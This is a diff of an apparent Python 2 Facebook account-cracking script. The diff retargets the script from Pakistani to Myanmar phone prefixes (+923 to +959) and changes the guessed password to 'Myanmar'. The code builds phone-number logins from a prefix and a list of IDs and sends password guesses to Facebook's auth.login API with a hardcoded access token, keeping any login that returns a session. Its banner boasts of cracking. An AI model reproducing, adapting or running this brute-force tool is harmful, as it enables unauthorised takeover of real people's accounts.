@@ -104,7 +104,7 @@ def action():
 		print "\033[1;95m05, 06, 07, 08, 09,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="03"
+			k="09"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -120,7 +120,7 @@ def action():
 		print "\033[1;95m45, 64, ??, ??, ??,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+959"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -136,7 +136,7 @@ def action():
 		print "\033[1;95m24, ??, ??, ??,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+959"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -152,7 +152,7 @@ def action():
 		print "\033[1;95m35, 36, 37, ??,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+959"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -168,7 +168,7 @@ def action():
 		print "\033[1;95m14, 15, 16, 17,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+959"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -201,7 +201,7 @@ def action():
 	time.sleep(0.5)
 	psb ('[✓] Please wait, process is running ...')
 	time.sleep(0.5)
-	psb ('[✓] Last 07 Digit Crack,786786,Pakistan Found ...')
+	psb ('[✓] Last 07 Digit Crack,969969, Myanmar Found ...')
 	time.sleep(0.5)
 	psb ('[!] Kalti Marne Ke lye(To Exit) Press CTRL Then Press z')
 	time.sleep(0.5)
@@ -234,7 +234,7 @@ def action():
 					cps.close()
 					cpb.append(c+user+pass1)
 				else:	
-					pass2 = 'Legend'
+					pass2 = 'Myanmar'
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
